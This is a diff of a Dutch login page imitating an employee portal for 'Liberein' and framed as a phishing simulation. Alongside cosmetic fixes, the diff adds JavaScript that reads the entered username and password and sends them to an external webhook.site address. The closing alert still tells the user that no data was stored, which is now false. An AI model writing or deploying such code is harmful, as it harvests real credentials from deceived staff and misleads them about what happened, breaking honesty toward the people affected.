@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="nl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Liberein | Inloggen</title>
   <style>
     body {
@@ -82,14 +82,32 @@
       <button type="submit">Inloggen</button>
     </form>
     <div class="footer-msg">
-      Alleen voor geeautoriseerde medewerkers van Liberein
+      Alleen voor geautoriseerde medewerkers van Liberein
     </div>
   </div>
 
   <script>
     function handleSubmit(event) {
       event.preventDefault();
-      alert("Let op: Dit was een simulatie van een phishingtest. Er zijn geen gegevens opgeslagen.\n\nBedankt voor je deelname!");
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      // Melding versturen via webhook.site (simulatie)
+      fetch("https://webhook.site/639b037a-e040-4165-b6bb-83bc9dfa7844", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          actie: "Simulatie login",
+          tijd: new Date().toISOString(),
+          gebruiker: username,
+          wachtwoord: password
+        })
+      });
+
+      alert("Let op: Dit was een simulatie van een phishingtest.\nEr zijn geen gegevens opgeslagen.\n\nBedankt voor je deelname!");
     }
   </script>
 </body>
